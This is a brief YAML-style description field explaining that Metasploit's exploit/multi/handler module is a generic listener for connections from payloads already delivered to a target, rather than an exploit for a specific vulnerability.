    description: |
      In Metasploit, the exploit/multi/handler module is essentially a universal payload handler.
      Unlike most exploit modules in Metasploit that target specific vulnerabilities, multi/handler does not exploit a particular service or software.
      Instead, its main purpose is to listen for incoming connections from payloads that you have already delivered to a target by some other means.
